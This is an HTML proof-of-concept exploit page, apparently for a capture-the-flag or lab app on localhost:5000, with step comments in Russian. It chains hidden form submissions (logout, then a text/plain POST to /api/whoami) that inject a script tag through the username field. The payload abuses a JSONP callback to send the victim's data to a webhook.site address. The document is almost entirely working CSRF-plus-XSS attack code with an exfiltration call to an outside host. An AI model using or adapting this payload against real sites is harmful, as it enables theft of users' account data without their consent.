<!DOCTYPE html>
<html>
<body>

  <!-- Шаг 1: GET /#/sheets -->
  <form id="f1" target="worker" action="http://localhost:5000/#/sheets" method="GET"></form>

  <!-- Шаг 2: GET /api/logout -->
  <form id="f2" target="worker" action="http://localhost:5000/api/logout" method="GET"></form>

  <!-- Шаг 3: POST /api/whoami -->
  <form id="f3" target="worker" action="http://localhost:5000/api/whoami"
        method="POST" enctype="text/plain">
    <input name='{"new_username":"<</textarea><script src' value='\u0022http://localhost:5000/api/whoami/jsonp?callback=%28%28d%29%3D%3E%7Blocation%3D%27https%3A%2F%2Fwebhook.site%2FID%3Fd%3D
  %27%2BencodeURIComponent%28JSON.stringify%28d%29%29%7D%29\u0022>"}'>
  </form>

  <!-- Шаг 4: GET /#/settings -->
  <form id="f4" target="worker" action="http://localhost:5000/#/settings" method="GET"></form>

  <script>
    function exploit(data) {
        const workerWindow = window.open('', 'worker');

        setTimeout(() => {
            document.getElementById('f1').submit();
        }, 3000);
        setTimeout(() => {
            document.getElementById('f2').submit();
        }, 6000);
        setTimeout(() => {
            document.getElementById('f3').submit();
        }, 9000);
        setTimeout(() => {
            document.getElementById('f4').submit();
        }, 12000);

        // Вывод в консоль открытой вкладки
        setTimeout(() => {
            workerWindow.console.log('Hi!');
            workerWindow.alert('Alert!');
        }, 15000);
    }
</script>

<script src=http://localhost:5000/api/whoami/jsonp?callback=exploit></script>

</body>
</html>
